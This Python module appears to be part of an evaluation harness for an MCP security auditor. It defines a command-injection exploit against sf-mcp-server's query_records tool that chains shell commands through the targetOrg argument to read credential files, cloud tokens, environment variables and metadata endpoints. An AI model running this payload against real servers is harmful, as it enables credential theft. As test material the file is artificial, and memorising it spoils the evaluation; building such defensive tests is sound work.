"""CVE-2026-26029: OS command injection in sf-mcp-server's query_records (command execution).

executeSoqlQuery builds `sf data query --target-org ${targetOrg} --query "${query}" --json` as a
shell string and runs it through child_process.exec. `targetOrg` is interpolated unquoted, so a
caller-supplied org alias carrying shell metacharacters runs arbitrary commands with the server
process's privileges. The payload sends the stolen bytes to stderr and exits non-zero, so node's
exec rejects with the output in the error message ("Command failed: ...\n<stderr>"), which the MCP
tool returns as its is_error text. The fix (commit 99fba01) switches to execFile("sf", args),
which spawns no shell, so the payload reaches the benign `sf` stub as one inert argument.

The reach is command_execution, so every kept place is read by running a command: cat for files,
id -un for the account, cat /proc/sys/kernel/hostname for the UTS name, printenv for the env var,
curl for the internal HTTP endpoints.
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve_environments import command_injection_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Place, Places, PlantKind
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_planting_spec import request_target, resolve_container_path
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

SERVICE = "holdout-2026-26029-sf-mcp"
PATCHED = "holdout-2026-26029-sf-mcp-patched"
WORKING_DIRECTORY = "/srv/app"

KEPT_PLACES: tuple[str, ...] = (
    "etc-shadow",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "kube-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "run-secrets",
    "k8s-sa-token",
    "etc-hosts",
    "auth-log",
    "process-account-identity",
    "container-hostname",
    "proc-environ",
    "imds",
    "ecs-task-credentials",
    "eks-pod-identity",
)

# run <cmd>, send its output to stderr, exit non-zero so exec() rejects with the output in the
# error message, and comment out the template's trailing `--query "..." --json`.
_INJECT = "zz ; {cmd} 1>&2 ; false #"

AIM = re.compile(r"[;&|`]|\$\(")  # a shell-injection operator in a tool argument

Exploit = Callable[[Places, MCPClientPort], Awaitable[None]]


def _call(target_org: str, *, fields: str = "Id", sobject: str = "Account") -> dict[str, object]:
    return {"input": {"targetOrg": target_org, "sObject": sobject, "fields": fields}}


def _read_command(place: Place) -> str:
    coords = place.coordinates
    if place.kind is PlantKind.FILE:
        raw = coords.paths[0] if coords.paths is not None else coords.path
        assert raw is not None
        return f"cat {resolve_container_path(raw, WORKING_DIRECTORY)}"
    if place.kind is PlantKind.ACCOUNT:
        return "id -un"
    if place.kind is PlantKind.HOSTNAME:
        return "cat /proc/sys/kernel/hostname"
    if place.kind is PlantKind.ENV:
        assert coords.name is not None
        return f"printenv {coords.name}"
    if place.kind is PlantKind.HTTP_ENDPOINT:
        assert coords.host is not None and coords.path is not None
        return f"curl -s http://{coords.host}{request_target(coords.path)}"
    raise ValueError(f"{place.id}: no command_execution reader for kind {place.kind}")


def _make_exploit(place_id: str) -> Exploit:
    async def exploit(places: Places, client: MCPClientPort) -> None:
        payload = _INJECT.format(cmd=_read_command(places[place_id]))
        await client.call_tool("query_records", _call(payload))

    return exploit


async def _benign(places: Places, client: MCPClientPort) -> None:
    await client.call_tool("query_records", _call("playground", fields="Id,Name"))


TARGET = CVETarget(
    cve_id="CVE-2026-26029",
    severity="CVSS 8.8 (v3.1, placeholder)",
    mechanism=MechanismClass.COMMAND_EXECUTION,
    aim=AIM,
    reaches=frozenset({"command_execution"}),
    kept_places=KEPT_PLACES,
    images=(SERVICE,),
    server_image=SERVICE,
    patched_image=PATCHED,
    planting_host=PlantingHost(SymbolicUser.UNPRIVILEGED, WORKING_DIRECTORY, has_network=False),
    builder=command_injection_env,
    exploits=tuple(_make_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "OS command injection: the query_records tool interpolates its attacker-controlled "
        "targetOrg unquoted into a shell string run with child_process.exec, so an org alias that "
        "chains a command (`zz ; <cmd> 1>&2 ; false #`) executes it in the server's container."
    ),
    tools_filter=None,
)
